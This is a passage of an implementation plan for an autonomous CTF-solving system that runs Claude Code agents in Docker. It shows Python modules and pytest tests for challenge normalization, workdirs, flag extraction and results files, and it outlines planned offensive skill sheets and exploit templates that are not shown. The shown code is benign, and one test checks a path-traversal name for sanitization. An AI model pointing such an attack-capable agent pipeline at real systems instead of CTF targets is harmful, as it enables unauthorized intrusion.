# Hydra P1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship P1 of the Hydra CTF solver — Python asyncio orchestrator + Docker worker image + 6 specialist agents + 8 core skills + 15 exploit templates — such that `hydra challenges.json` produces `flags.json` for a batch of CTF challenges.

**Architecture:** Single-file-per-module Python package (`hydra/`) with asyncio. Orchestrator spawns N parallel Docker containers; each runs `claude -p --model claude-opus-4-6` against a per-challenge workdir. Inside the container, Claude reads `CLAUDE.md` → triages → `Task()` to category specialist → specialist consults `.claude/skills/*.md` and adapts `exploits/*.py` → writes `./flag.txt` + `FLAG:` line.

**Tech Stack:** Python 3.12, asyncio, pytest, Docker CE, Claude Code CLI (`@anthropic-ai/claude-code`), Ubuntu 24.04 base, pwntools, z3-solver, angr, sagemath, volatility3, radare2, ghidra headless, ffuf/sqlmap/nikto, RsaCtfTool.

**Spec reference:** `docs/superpowers/specs/2026-04-14-hydra-ctf-agent-design.md`

---

## File Structure

```
hydra/
├── CLAUDE.md                          # thin triage+dispatch (Task 14)
├── README.md                          # user quickstart (Task 30)
├── Dockerfile                         # worker image (Task 13)
├── pyproject.toml                     # Task 1
├── hydra/
│   ├── __init__.py                    # Task 1
│   ├── models.py                      # dataclasses (Task 2)
│   ├── normalize.py                   # JSON normalizer (Task 3)
│   ├── workdir.py                     # per-challenge FS setup (Task 4)
│   ├── flag_extractor.py              # flag priority chain (Task 5)
│   ├── results.py                     # JSONL + JSON + flags.json (Task 6)
│   ├── failures.py                    # failure md generator (Task 7)
│   ├── docker_worker.py               # async docker run wrapper (Task 8)
│   ├── orchestrator.py                # main semaphore loop (Task 9)
│   └── cli.py                         # argparse entry (Task 10)
├── .claude/
│   ├── agents/
│   │   ├── pwn-specialist.md          # Task 15
│   │   ├── crypto-specialist.md       # Task 16
│   │   ├── web-specialist.md          # Task 17
│   │   ├── rev-specialist.md          # Task 18
│   │   ├── forensics-specialist.md    # Task 19
│   │   └── misc-specialist.md         # Task 20
│   └── skills/
│       ├── crypto/{rsa-attacks,aes-modes}.md           # Task 21
│       ├── pwn/{rop-chains,format-string}.md           # Task 22
│       ├── web/{sqli-cheatsheet,ssti-bypass,jwt}.md    # Task 23
│       └── forensics/stego-checklist.md                # Task 24
├── exploits/
│   ├── crypto/ (6 templates)          # Task 25
│   ├── web/ (3 templates)             # Task 26
│   ├── pwn/ (3 templates)             # Task 27
│   └── forensics/ (3 templates)       # Task 28
└── tests/
    ├── unit/
    │   ├── test_normalize.py          # Task 3
    │   ├── test_workdir.py            # Task 4
    │   ├── test_flag_extractor.py     # Task 5
    │   ├── test_results.py            # Task 6
    │   ├── test_failures.py           # Task 7
    │   └── test_docker_worker.py      # Task 8
    ├── integration/
    │   └── test_pipeline.py           # Task 29
    ├── e2e/
    │   ├── fixtures/ (5 canned challenges)
    │   └── test_canned.py             # Task 31
    └── fixtures/
        ├── challenges/                # Task 3 seeds + Task 31 seeds
        └── stdout_samples/            # Task 5 seeds
```

---

## Task Index (30 tasks)

| # | Task | Category |
|---|------|----------|
| 1 | Project scaffolding | setup |
| 2 | Data models (Challenge, Result) | code |
| 3 | JSON normalizer + tests | code |
| 4 | Workdir builder + tests | code |
| 5 | Flag extractor + tests | code |
| 6 | Results writers + tests | code |
| 7 | Failure-md generator + tests | code |
| 8 | Docker worker wrapper + tests | code |
| 9 | Orchestrator main loop + tests | code |
| 10 | CLI entry point + tests | code |
| 11 | Wire up `pyproject.toml` entry + smoke | integration |
| 12 | Base Dockerfile (system + python) | docker |
| 13 | Dockerfile add CTF tools + Claude CLI | docker |
| 14 | CLAUDE.md rewrite (thin triage) | content |
| 15 | pwn-specialist.md | content |
| 16 | crypto-specialist.md | content |
| 17 | web-specialist.md | content |
| 18 | rev-specialist.md | content |
| 19 | forensics-specialist.md | content |
| 20 | misc-specialist.md | content |
| 21 | Crypto skills (rsa, aes) | content |
| 22 | Pwn skills (rop, fmtstr) | content |
| 23 | Web skills (sqli, ssti, jwt) | content |
| 24 | Forensics skill (stego) | content |
| 25 | Crypto exploit templates (6) | content |
| 26 | Web exploit templates (3) | content |
| 27 | Pwn exploit templates (3) | content |
| 28 | Forensics exploit templates (3) | content |
| 29 | Integration test with fake docker | test |
| 30 | README.md + final smoke | docs |

E2E tests (5 canned challenges + real docker) are intentionally deferred to a P2 hardening pass to keep P1 scope tight. P1 acceptance = integration tests green + image builds + dry-run smoke.

---

## Task 1: Project scaffolding

**Files:**
- Create: `pyproject.toml`
- Create: `hydra/__init__.py`
- Create: `tests/unit/__init__.py`
- Create: `tests/integration/__init__.py`
- Create: `tests/fixtures/challenges/.gitkeep`

- [ ] **Step 1: Create `pyproject.toml`**

```toml
[project]
name = "hydra-ctf"
version = "0.1.0"
description = "Autonomous CTF solver — JSON in, flags out"
requires-python = ">=3.12"
dependencies = []

[project.optional-dependencies]
dev = [
    "pytest>=8.3",
    "pytest-asyncio>=0.24",
    "pytest-mock>=3.14",
]

[project.scripts]
hydra = "hydra.cli:main"

[build-system]
requires = ["setuptools>=75"]
build-backend = "setuptools.build_meta"

[tool.setuptools.packages.find]
where = ["."]
include = ["hydra*"]

[tool.pytest.ini_options]
asyncio_mode = "auto"
testpaths = ["tests/unit", "tests/integration"]
```

- [ ] **Step 2: Create empty package markers**

```bash
mkdir -p hydra tests/unit tests/integration tests/fixtures/challenges
touch hydra/__init__.py tests/unit/__init__.py tests/integration/__init__.py tests/fixtures/challenges/.gitkeep
```

- [ ] **Step 3: Install dev deps into a venv**

```bash
python3.12 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
```

Expected: `Successfully installed hydra-ctf-0.1.0 pytest-8.x pytest-asyncio-0.x pytest-mock-3.x`

- [ ] **Step 4: Confirm pytest runs (no tests yet)**

```bash
.venv/bin/pytest
```

Expected: `no tests ran in 0.01s` (exit 5 is OK for "no tests collected")

- [ ] **Step 5: Commit**

```bash
git add pyproject.toml hydra/__init__.py tests/
git commit -m "chore: scaffold hydra python package"
```

Add `.venv/` to `.gitignore` if not already present.

---

## Task 2: Data models

**Files:**
- Create: `hydra/models.py`
- Create: `tests/unit/test_models.py`

- [ ] **Step 1: Write failing test**

`tests/unit/test_models.py`:
```python
from pathlib import Path
from hydra.models import Challenge, Result

def test_challenge_minimal():
    c = Challenge(name="baby", description="solve me")
    assert c.name == "baby"
    assert c.description == "solve me"
    assert c.files == []
    assert c.remote is None
    assert c.hints == []
    assert c.category is None
    assert c.points is None

def test_challenge_rich():
    c = Challenge(
        name="pwn1",
        description="ret2libc",
        files=[Path("/tmp/pwn1")],
        remote="nc host 1337",
        hints=["use libc 2.35"],
        category="pwn",
        points=200,
    )
    assert c.files == [Path("/tmp/pwn1")]
    assert c.remote == "nc host 1337"
    assert c.hints == ["use libc 2.35"]
    assert c.points == 200

def test_result_solved():
    r = Result(
        name="baby",
        status="solved",
        flag="flag{abc}",
        duration_s=12.3,
        started_at="2026-04-14T00:00:00Z",
        finished_at="2026-04-14T00:00:12Z",
        worker_exit_code=0,
        work_dir="./runs/baby/",
    )
    assert r.status == "solved"
    assert r.flag == "flag{abc}"
    assert r.reason is None

def test_result_failed_has_reason():
    r = Result(
        name="x",
        status="timeout",
        flag=None,
        duration_s=3600.0,
        started_at="...",
        finished_at="...",
        worker_exit_code=124,
        work_dir="./runs/x/",
        reason="wall-clock timeout",
    )
    assert r.flag is None
    assert r.reason == "wall-clock timeout"
```

- [ ] **Step 2: Run test, verify fails**

```bash
.venv/bin/pytest tests/unit/test_models.py -v
```
Expected: `ImportError: cannot import name 'Challenge' from 'hydra.models'` or `ModuleNotFoundError`.

- [ ] **Step 3: Implement `hydra/models.py`**

```python
from dataclasses import dataclass, field
from pathlib import Path
from typing import Literal

Status = Literal["solved", "failed", "timeout", "error", "solved_uncertain"]

@dataclass
class Challenge:
    name: str
    description: str
    files: list[Path] = field(default_factory=list)
    remote: str | None = None
    hints: list[str] = field(default_factory=list)
    category: str | None = None
    points: int | None = None

@dataclass
class Result:
    name: str
    status: Status
    flag: str | None
    duration_s: float
    started_at: str
    finished_at: str
    worker_exit_code: int
    work_dir: str
    reason: str | None = None
```

- [ ] **Step 4: Run test, verify passes**

```bash
.venv/bin/pytest tests/unit/test_models.py -v
```
Expected: all 4 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/models.py tests/unit/test_models.py
git commit -m "feat: add Challenge and Result data models"
```

---

## Task 3: JSON normalizer

**Files:**
- Create: `hydra/normalize.py`
- Create: `tests/unit/test_normalize.py`
- Create: `tests/fixtures/challenges/minimal.json`
- Create: `tests/fixtures/challenges/rich.json`
- Create: `tests/fixtures/challenges/unusual_keys.json`

**Why:** Q4=C means we sniff fields across common naming conventions. Accept `name|title|id`, `description|prompt|task|challenge`, `files|attachments|paths`, `remote|host|url|service`, `hints|hint`, `category|tag`, `points|score|value`.

- [ ] **Step 1: Write fixture files**

`tests/fixtures/challenges/minimal.json`:
```json
[
  {"name": "baby-rsa", "description": "Decrypt this."}
]
```

`tests/fixtures/challenges/rich.json`:
```json
[
  {
    "name": "pwn1",
    "category": "pwn",
    "points": 200,
    "description": "Classic ret2libc.",
    "files": ["/tmp/pwn1-binary"],
    "remote": "nc chal.example.com 1337",
    "hints": ["libc is 2.35"]
  }
]
```

`tests/fixtures/challenges/unusual_keys.json`:
```json
[
  {
    "title": "web-login",
    "prompt": "SQL injection somewhere.",
    "attachments": [],
    "url": "http://ctf.example.com:8080",
    "tag": "web",
    "score": 100
  }
]
```

- [ ] **Step 2: Write failing tests**

`tests/unit/test_normalize.py`:
```python
import json
from pathlib import Path
import pytest
from hydra.normalize import normalize_challenges, NormalizationError

FIXTURES = Path(__file__).parent.parent / "fixtures" / "challenges"

def load(name: str):
    return json.loads((FIXTURES / name).read_text())

def test_minimal():
    [c] = normalize_challenges(load("minimal.json"))
    assert c.name == "baby-rsa"
    assert c.description == "Decrypt this."
    assert c.files == []
    assert c.remote is None

def test_rich():
    [c] = normalize_challenges(load("rich.json"))
    assert c.name == "pwn1"
    assert c.category == "pwn"
    assert c.points == 200
    assert c.files == [Path("/tmp/pwn1-binary")]
    assert c.remote == "nc chal.example.com 1337"
    assert c.hints == ["libc is 2.35"]

def test_unusual_keys():
    [c] = normalize_challenges(load("unusual_keys.json"))
    assert c.name == "web-login"
    assert c.description == "SQL injection somewhere."
    assert c.remote == "http://ctf.example.com:8080"
    assert c.category == "web"
    assert c.points == 100

def test_name_fallback_to_hash():
    raw = [{"description": "no name here"}]
    [c] = normalize_challenges(raw)
    assert c.name.startswith("chal-")
    assert len(c.name) <= 16

def test_id_as_name():
    [c] = normalize_challenges([{"id": "Q42", "description": "x"}])
    assert c.name == "Q42"

def test_task_as_description():
    [c] = normalize_challenges([{"name": "x", "task": "solve it"}])
    assert c.description == "solve it"

def test_hint_singular():
    [c] = normalize_challenges([{"name": "x", "description": "y", "hint": "try harder"}])
    assert c.hints == ["try harder"]

def test_paths_coerced_to_path():
    [c] = normalize_challenges([
        {"name": "x", "description": "y", "paths": ["a.txt", "b.bin"]}
    ])
    assert all(isinstance(p, Path) for p in c.files)
    assert [p.name for p in c.files] == ["a.txt", "b.bin"]

def test_reject_no_desc_no_files():
    with pytest.raises(NormalizationError):
        normalize_challenges([{"name": "x"}])

def test_accept_files_no_description():
    [c] = normalize_challenges([{"name": "x", "files": ["/tmp/a"]}])
    assert c.description == ""
    assert c.files == [Path("/tmp/a")]

def test_unicode_names():
    [c] = normalize_challenges([{"name": "รหัสลับ", "description": "solve"}])
    assert c.name == "รหัสลับ"

def test_whole_file_not_list_fails():
    with pytest.raises(NormalizationError):
        normalize_challenges({"not": "a list"})

def test_empty_list_ok():
    assert normalize_challenges([]) == []

def test_duplicate_names_appended_suffix():
    [a, b] = normalize_challenges([
        {"name": "x", "description": "1"},
        {"name": "x", "description": "2"},
    ])
    assert a.name == "x"
    assert b.name == "x-2"

def test_safe_name_for_workdir():
    from hydra.normalize import safe_name
    assert safe_name("hello world") == "hello-world"
    assert safe_name("a/b") == "a-b"
    assert safe_name("../evil") == "-evil"
    assert safe_name("รหัสลับ") == "รหัสลับ"  # unicode OK
```

- [ ] **Step 3: Run tests, verify they fail**

```bash
.venv/bin/pytest tests/unit/test_normalize.py -v
```
Expected: `ModuleNotFoundError: No module named 'hydra.normalize'`

- [ ] **Step 4: Implement `hydra/normalize.py`**

```python
import hashlib
import re
from pathlib import Path
from typing import Any
from hydra.models import Challenge

class NormalizationError(Exception):
    pass

_NAME_KEYS = ("name", "title", "id")
_DESC_KEYS = ("description", "prompt", "task", "challenge")
_FILES_KEYS = ("files", "attachments", "paths")
_REMOTE_KEYS = ("remote", "host", "url", "service")
_HINTS_KEYS = ("hints", "hint")
_CAT_KEYS = ("category", "tag")
_POINTS_KEYS = ("points", "score", "value")

def _first(d: dict[str, Any], keys: tuple[str, ...]) -> Any:
    for k in keys:
        if k in d and d[k] not in (None, ""):
            return d[k]
    return None

def _as_list(v: Any) -> list:
    if v is None:
        return []
    if isinstance(v, list):
        return v
    return [v]

def safe_name(s: str) -> str:
    # Replace filesystem-hostile chars; keep unicode letters.
    out = re.sub(r"[\s/\\:]+", "-", s)
    out = re.sub(r"\.+", "", out)
    return out or "unnamed"

def _normalize_one(raw: dict[str, Any], idx: int) -> Challenge:
    name = _first(raw, _NAME_KEYS)
    desc = _first(raw, _DESC_KEYS) or ""
    files_raw = _as_list(_first(raw, _FILES_KEYS))
    files = [Path(p) for p in files_raw]

    if not name:
        seed = (desc + str(files)).encode()
        name = "chal-" + hashlib.sha1(seed).hexdigest()[:8]

    if not desc and not files:
        raise NormalizationError(
            f"entry #{idx} ({name!r}) has no description and no files"
        )

    hints = _as_list(_first(raw, _HINTS_KEYS))
    points = _first(raw, _POINTS_KEYS)

    return Challenge(
        name=str(name),
        description=str(desc),
        files=files,
        remote=_first(raw, _REMOTE_KEYS),
        hints=[str(h) for h in hints],
        category=_first(raw, _CAT_KEYS),
        points=int(points) if points is not None else None,
    )

def normalize_challenges(raw: Any) -> list[Challenge]:
    if not isinstance(raw, list):
        raise NormalizationError("top-level JSON must be a list")

    out: list[Challenge] = []
    seen: dict[str, int] = {}
    for idx, entry in enumerate(raw):
        if not isinstance(entry, dict):
            raise NormalizationError(f"entry #{idx} is not an object")
        c = _normalize_one(entry, idx)
        # De-duplicate names by appending -2, -3, ...
        base = c.name
        count = seen.get(base, 0)
        if count > 0:
            c = Challenge(**{**c.__dict__, "name": f"{base}-{count+1}"})
        seen[base] = count + 1
        out.append(c)
    return out
```

- [ ] **Step 5: Run tests, verify all pass**

```bash
.venv/bin/pytest tests/unit/test_normalize.py -v
```
Expected: all 15 tests PASS.

- [ ] **Step 6: Commit**

```bash
git add hydra/normalize.py tests/unit/test_normalize.py tests/fixtures/challenges/
git commit -m "feat: flexible JSON normalizer with field sniffing"
```

---

## Task 4: Workdir builder

**Files:**
- Create: `hydra/workdir.py`
- Create: `tests/unit/test_workdir.py`

**Why:** Q12=C — create `./runs/<name>/{challenge,work,logs}/` per challenge with files copied in + a `README.md` built from the challenge, so Claude's triage step finds the prompt on disk.

- [ ] **Step 1: Write failing tests**

`tests/unit/test_workdir.py`:
```python
from pathlib import Path
import pytest
from hydra.models import Challenge
from hydra.workdir import build_workdir

def test_creates_expected_layout(tmp_path: Path):
    runs = tmp_path / "runs"
    c = Challenge(name="baby-rsa", description="solve this")
    wd = build_workdir(c, runs_dir=runs)

    assert wd == runs / "baby-rsa"
    assert (wd / "challenge").is_dir()
    assert (wd / "work").is_dir()
    assert (wd / "logs").is_dir()
    assert (wd / "flag.txt").exists()
    assert (wd / "flag.txt").read_text() == ""

def test_readme_contains_description(tmp_path: Path):
    c = Challenge(name="x", description="classic ret2libc")
    wd = build_workdir(c, runs_dir=tmp_path)
    readme = (wd / "challenge" / "README.md").read_text()
    assert "# x" in readme
    assert "classic ret2libc" in readme

def test_readme_contains_metadata(tmp_path: Path):
    c = Challenge(
        name="x", description="y", category="pwn", points=200,
        remote="nc host 1337",
    )
    wd = build_workdir(c, runs_dir=tmp_path)
    readme = (wd / "challenge" / "README.md").read_text()
    assert "**Category:** pwn" in readme
    assert "**Points:** 200" in readme
    assert "nc host 1337" in readme

def test_hints_written_separately(tmp_path: Path):
    c = Challenge(name="x", description="y", hints=["try harder", "think outside the box"])
    wd = build_workdir(c, runs_dir=tmp_path)
    hints = (wd / "challenge" / "hints.md").read_text()
    assert "try harder" in hints
    assert "think outside the box" in hints

def test_no_hints_no_file(tmp_path: Path):
    c = Challenge(name="x", description="y")
    wd = build_workdir(c, runs_dir=tmp_path)
    assert not (wd / "challenge" / "hints.md").exists()

def test_copies_files(tmp_path: Path):
    src = tmp_path / "src"
    src.mkdir()
    (src / "chal.bin").write_bytes(b"\x7fELF...")
    c = Challenge(name="x", description="y", files=[src / "chal.bin"])
    wd = build_workdir(c, runs_dir=tmp_path / "runs")
    assert (wd / "challenge" / "chal.bin").read_bytes() == b"\x7fELF..."

def test_missing_file_logged_not_fatal(tmp_path: Path):
    c = Challenge(name="x", description="y", files=[Path("/nonexistent/nope.bin")])
    wd = build_workdir(c, runs_dir=tmp_path / "runs")
    warnings = (wd / "logs" / "warnings.log").read_text()
    assert "nonexistent" in warnings

def test_filename_collision_suffixes(tmp_path: Path):
    (tmp_path / "a").mkdir(); (tmp_path / "b").mkdir()
    (tmp_path / "a" / "dup.txt").write_text("A")
    (tmp_path / "b" / "dup.txt").write_text("B")
    c = Challenge(name="x", description="y", files=[
        tmp_path / "a" / "dup.txt", tmp_path / "b" / "dup.txt"
    ])
    wd = build_workdir(c, runs_dir=tmp_path / "runs")
    files = sorted(p.name for p in (wd / "challenge").glob("dup*"))
    assert "dup.txt" in files
    assert any(f.startswith("dup_") for f in files)
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_workdir.py -v
```
Expected: import errors.

- [ ] **Step 3: Implement `hydra/workdir.py`**

```python
import shutil
from pathlib import Path
from hydra.models import Challenge

def build_workdir(c: Challenge, *, runs_dir: Path) -> Path:
    wd = runs_dir / c.name
    (wd / "challenge").mkdir(parents=True, exist_ok=True)
    (wd / "work").mkdir(exist_ok=True)
    (wd / "logs").mkdir(exist_ok=True)
    (wd / "flag.txt").touch()

    _copy_files(c, wd)
    (wd / "challenge" / "README.md").write_text(_readme(c))
    if c.hints:
        (wd / "challenge" / "hints.md").write_text(_hints_md(c.hints))
    return wd

def _copy_files(c: Challenge, wd: Path) -> None:
    dest = wd / "challenge"
    warnings: list[str] = []
    used: set[str] = set()
    for src in c.files:
        if not src.exists():
            warnings.append(f"missing file: {src}")
            continue
        target_name = src.name
        if target_name in used:
            stem, suffix = src.stem, src.suffix
            n = 2
            while f"{stem}_{n}{suffix}" in used:
                n += 1
            target_name = f"{stem}_{n}{suffix}"
        used.add(target_name)
        shutil.copy2(src, dest / target_name)
    if warnings:
        (wd / "logs" / "warnings.log").write_text("\n".join(warnings) + "\n")

def _readme(c: Challenge) -> str:
    parts = [f"# {c.name}", ""]
    parts.append(f"**Category:** {c.category or 'unknown'}")
    parts.append(f"**Points:** {c.points if c.points is not None else '?'}")
    parts.append(f"**Remote:** {c.remote or 'none'}")
    parts.append("")
    parts.append("## Description")
    parts.append("")
    parts.append(c.description or "(no description provided)")
    if c.files:
        parts.append("")
        parts.append("## Files")
        parts.append("")
        for f in c.files:
            parts.append(f"- {f.name}")
    return "\n".join(parts) + "\n"

def _hints_md(hints: list[str]) -> str:
    lines = ["# Hints", ""]
    for i, h in enumerate(hints, 1):
        lines.append(f"{i}. {h}")
    return "\n".join(lines) + "\n"
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_workdir.py -v
```
Expected: all 8 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/workdir.py tests/unit/test_workdir.py
git commit -m "feat: per-challenge workdir builder with README generation"
```

---

## Task 5: Flag extractor

**Files:**
- Create: `hydra/flag_extractor.py`
- Create: `tests/unit/test_flag_extractor.py`

**Why:** Spec section 5 step 6 — priority chain: `./flag.txt` > `FLAG:` line > regex sweep, with specific-before-generic within the regex sweep.

- [ ] **Step 1: Write failing tests**

`tests/unit/test_flag_extractor.py`:
```python
from pathlib import Path
from hydra.flag_extractor import extract_flag

def test_flag_file_preferred(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("flag{from_file}\n")
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout="flag{from_stdout}")
    assert flag == "flag{from_file}"

def test_fallback_to_stdout_line(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    stdout = "working...\nFLAG: flag{via_line}\nbye"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "flag{via_line}"

def test_regex_fallback(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    stdout = "some output contains CTF{buried}\n"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "CTF{buried}"

def test_no_flag_returns_none(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout="no flag here")
    assert flag is None

def test_flag_file_missing_ok(tmp_path: Path):
    # Treat missing file as empty — fall through.
    stdout = "FLAG: flag{ok}"
    flag = extract_flag(flag_file=tmp_path / "nope.txt", stdout=stdout)
    assert flag == "flag{ok}"

def test_multiple_flags_take_most_specific_last(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    stdout = "early CTF{first}\nlater flag{winner}\n"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "flag{winner}"

def test_uppercase_flag(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    stdout = "FLAG{SHOUTY}"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "FLAG{SHOUTY}"

def test_custom_prefix(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    stdout = "the answer is picoCTF{pic0_flag}"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "picoCTF{pic0_flag}"

def test_whitespace_stripped_from_file(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("  flag{trim}  \n\n")
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout="")
    assert flag == "flag{trim}"

def test_last_flag_line_wins(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    stdout = "FLAG: flag{early}\nactually FLAG: flag{late}\n"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "flag{late}"

def test_nested_braces_ok(tmp_path: Path):
    (tmp_path / "flag.txt").write_text("")
    # Spec regex stops at first `}` — the flag format doesn't nest.
    stdout = "flag{inner}extra}"
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout="")
    # File empty, stdout has flag after — should find flag{inner}
    flag = extract_flag(flag_file=tmp_path / "flag.txt", stdout=stdout)
    assert flag == "flag{inner}"
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_flag_extractor.py -v
```

- [ ] **Step 3: Implement `hydra/flag_extractor.py`**

```python
import re
from pathlib import Path

_SPECIFIC = [
    re.compile(r"flag\{[^}]+\}"),
    re.compile(r"FLAG\{[^}]+\}"),
    re.compile(r"CTF\{[^}]+\}"),
]
_GENERIC = re.compile(r"[A-Za-z0-9_]+\{[^}]+\}")
_FLAG_LINE = re.compile(r"FLAG:\s*(\S+)")

def extract_flag(*, flag_file: Path, stdout: str) -> str | None:
    # Priority 1: flag.txt
    if flag_file.exists():
        content = flag_file.read_text().strip()
        if content and _looks_like_flag(content):
            return content

    # Priority 2: last "FLAG: <value>" line
    line_matches = _FLAG_LINE.findall(stdout)
    if line_matches:
        candidate = line_matches[-1]
        if _looks_like_flag(candidate):
            return candidate

    # Priority 3: regex sweep — specific first, then generic, last match wins
    for pat in _SPECIFIC:
        hits = pat.findall(stdout)
        if hits:
            return hits[-1]
    hits = _GENERIC.findall(stdout)
    if hits:
        return hits[-1]
    return None

def _looks_like_flag(s: str) -> bool:
    return bool(_GENERIC.fullmatch(s))
```

- [ ] **Step 4: Run tests, verify pass**

```bash
.venv/bin/pytest tests/unit/test_flag_extractor.py -v
```
Expected: all 11 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add hydra/flag_extractor.py tests/unit/test_flag_extractor.py
git commit -m "feat: priority-chained flag extractor"
```

---

## Task 6: Results writers (JSONL + JSON + flags.json)

**Files:**
- Create: `hydra/results.py`
- Create: `tests/unit/test_results.py`

**Why:** Spec section 5 step 7–8 — stream one line per finished challenge to `results.jsonl` (fsync'd), atomically rewrite `flags.json`, aggregate into `results.json` at end. Also implement resume logic (dedup on name).

- [ ] **Step 1: Write failing tests**

`tests/unit/test_results.py`:
```python
import json
from pathlib import Path
from hydra.models import Result
from hydra.results import ResultsWriter, load_jsonl_names

def _mk(name, status, flag=None):
    return Result(
        name=name, status=status, flag=flag,
        duration_s=1.0, started_at="t0", finished_at="t1",
        worker_exit_code=0, work_dir=f"./runs/{name}/",
    )

def test_append_jsonl_creates_file(tmp_path: Path):
    w = ResultsWriter(
        jsonl_path=tmp_path / "r.jsonl",
        flags_path=tmp_path / "f.json",
        results_path=tmp_path / "r.json",
    )
    w.append(_mk("a", "solved", "flag{1}"))
    lines = (tmp_path / "r.jsonl").read_text().splitlines()
    assert len(lines) == 1
    assert json.loads(lines[0])["name"] == "a"

def test_flags_json_updates_atomically(tmp_path: Path):
    w = ResultsWriter(
        jsonl_path=tmp_path / "r.jsonl",
        flags_path=tmp_path / "f.json",
        results_path=tmp_path / "r.json",
    )
    w.append(_mk("a", "solved", "flag{A}"))
    w.append(_mk("b", "failed"))
    flags = json.loads((tmp_path / "f.json").read_text())
    assert flags["a"] == "flag{A}"
    assert flags["__failed__"] == ["b"]
    assert "b" not in flags or flags.get("b") is None

def test_finalize_writes_results_json(tmp_path: Path):
    w = ResultsWriter(
        jsonl_path=tmp_path / "r.jsonl",
        flags_path=tmp_path / "f.json",
        results_path=tmp_path / "r.json",
    )
    w.append(_mk("a", "solved", "flag{A}"))
    w.append(_mk("b", "timeout"))
    w.finalize(run_id="run-xyz")
    data = json.loads((tmp_path / "r.json").read_text())
    assert data["run_id"] == "run-xyz"
    assert data["summary"]["total"] == 2
    assert data["summary"]["solved"] == 1
    assert data["summary"]["timeout"] == 1
    assert len(data["challenges"]) == 2

def test_load_jsonl_names_for_resume(tmp_path: Path):
    jsonl = tmp_path / "r.jsonl"
    jsonl.write_text(
        '{"name":"a","status":"solved"}\n{"name":"b","status":"failed"}\n'
    )
    solved, failed = load_jsonl_names(jsonl)
    assert solved == {"a"}
    assert failed == {"b"}

def test_load_jsonl_missing_file(tmp_path: Path):
    solved, failed = load_jsonl_names(tmp_path / "missing.jsonl")
    assert solved == set()
    assert failed == set()
```

- [ ] **Step 2: Run tests, verify fail**

```bash
.venv/bin/pytest tests/unit/test_results.py -v
```

- [ ] **Step 3: Implement `hydra/results.py`**

```python
import json
import os
import tempfile
from dataclasses import asdict
from pathlib import Path
from hydra.models import Result

class ResultsWriter:
    def __init__(
        self,
        *,
        jsonl_path: Path,
        flags_path: Path,
        results_path: Path,
    ):
        self.jsonl_path = jsonl_path
        self.flags_path = flags_path
        self.results_path = results_path
        self._results: list[Result] = []
        # Pre-load existing jsonl so finalize sees everything (supports resume).
        if jsonl_path.exists():
            for line in jsonl_path.read_text().splitlines():
                if not line.strip():
                    continue
                try:
                    d = json.loads(line)
                    self._results.append(Result(**d))
                except Exception:
                    continue

    def append(self, r: Result) -> None:
        self._results.append(r)
        with self.jsonl_path.open("a") as f:
            f.write(json.dumps(asdict(r), default=str) + "\n")
            f.flush()
            os.fsync(f.fileno())
        self._write_flags_json()

    def _write_flags_json(self) -> None:
        data: dict = {}
        failed: list[str] = []
        for r in self._results:
            if r.status in ("solved", "solved_uncertain") and r.flag:
                data[r.name] = r.flag
            else:
                failed.append(r.name)
        if failed:
            data["__failed__"] = failed
        _atomic_write(self.flags_path, json.dumps(data, indent=2, ensure_ascii=False))

    def finalize(self, *, run_id: str) -> None:
        summary = {
            "total": len(self._results),
            "solved": sum(1 for r in self._results if r.status == "solved"),
            "solved_uncertain": sum(
                1 for r in self._results if r.status == "solved_uncertain"
            ),
            "failed": sum(1 for r in self._results if r.status == "failed"),
            "timeout": sum(1 for r in self._results if r.status == "timeout"),
            "error": sum(1 for r in self._results if r.status == "error"),
            "total_duration_s": sum(r.duration_s for r in self._results),
        }
        if summary["total"] > 0:
            summary["solve_rate"] = round(summary["solved"] / summary["total"], 4)
        else:
            summary["solve_rate"] = 0.0
        payload = {
            "run_id": run_id,
            "summary": summary,
            "challenges": [asdict(r) for r in self._results],
        }
        _atomic_write(
            self.results_path,
            json.dumps(payload, indent=2, default=str, ensure_ascii=False),
        )

def _atomic_write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    fd, tmp = tempfile.mkstemp(dir=path.parent, prefix=f".{path.name}.", suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            f.write(content)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp, path)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise

def load_jsonl_names(jsonl_path: Path) -> tuple[set[str], set[str]]:
    solved: set[str] = set()
    failed: set[str] = set()
    if not jsonl_path.exists():
        return solved, failed
    for line in jsonl_path.read_text().splitlines():
        if not line.strip():
            continue
        try:
            d = json.loads(line)
        except json.JSONDecodeError:
            continue
        name = d.get("name")
        status = d.get("status")
        if not name:
            continue
